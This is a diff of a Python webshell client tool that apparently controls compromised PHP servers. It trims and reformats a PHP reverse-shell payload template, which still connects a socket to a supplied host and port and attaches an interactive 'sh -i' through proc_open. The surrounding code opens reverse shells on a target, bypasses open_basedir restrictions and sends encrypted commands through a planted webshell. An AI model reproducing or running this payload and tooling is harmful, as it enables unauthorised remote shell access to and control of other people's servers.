@@ -470,32 +470,21 @@ decoder_echo($content);
 """
 )
 
-REVERSE_SHELL = compress_phpcode_template("""
+# TODO: add more methods
+
+REVERSE_SHELL = compress_phpcode_template(
+    """
 @session_write_close();
 $host = {host};
 $port = {port};
 if(function_exists("fsockopen") && function_exists("proc_open")) {
     $sock=fsockopen($host, $port);
     $proc=proc_open("sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
-}else if(function_exists("fsockopen") && function_exists("exec")) {
-    $sock=fsockopen($host, $port);
-    exec("sh -i <&3 >&3 2>&3");
-}else if(function_exists("fsockopen") && function_exists("system")) {
-    $sock=fsockopen($host, $port);
-    system("sh -i <&3 >&3 2>&3");
-}else if(function_exists("fsockopen") && function_exists("shell_exec")) {
-    $sock=fsockopen($host, $port);
-    shell_exec("sh -i <&3 >&3 2>&3");
-}else if(function_exists("fsockopen") && function_exists("passthru")) {
-    $sock=fsockopen($host, $port);
-    passthru("sh -i <&3 >&3 2>&3");
-}else if(function_exists("fsockopen") && function_exists("popen")) {
-    $sock=fsockopen($host, $port);
-    popen("sh -i <&3 >&3 2>&3", "r");
 }else{
     decoder_echo("WRONG_NO_METHOD");
 }
-""")
+"""
+)
 
 PAYLOAD_SESSIONIZE = compress_phpcode_template(
     """
@@ -1187,11 +1176,7 @@ class PHPWebshellActions(PHPSessionInterface):
         return await self.submit_http(code)
 
     async def open_reverse_shell(self, host: str, port: int) -> None:
-        code = format_phpcode(
-            REVERSE_SHELL,
-            host=string_repr(host),
-            port=str(port)
-        )
+        code = format_phpcode(REVERSE_SHELL, host=string_repr(host), port=str(port))
         result = await self.submit(code)
         if result == "WRONG_NO_METHOD":
             raise TargetError("目标打开反弹shell对应的函数")
@@ -1303,10 +1288,9 @@ class PHPWebshellCommunication(PHPWebshellActions):
     def bypass_opendir_wrapper(self, submitter: Submitter) -> Submitter:
         @functools.wraps(submitter)
         async def wrap(payload: str) -> str:
-            return await submitter(format_phpcode(
-                BYPASS_OPEN_BASEDIR_PHP,
-                payload=payload
-            ))
+            return await submitter(
+                format_phpcode(BYPASS_OPEN_BASEDIR_PHP, payload=payload)
+            )
 
         return wrap
 
@@ -1324,8 +1308,8 @@ class PHPWebshellCommunication(PHPWebshellActions):
             result_enc = await submitter(
                 format_phpcode(
                     ENCRYPTION_COMMUNICATE_PHP,
-                    session_name = string_repr(self.aes_session_name),
-                    code_enc = string_repr(base64_encode(payload_enc))
+                    session_name=string_repr(self.aes_session_name),
+                    code_enc=string_repr(base64_encode(payload_enc)),
                 )
             )
             if result_enc == "WRONG_NO_SESSION":
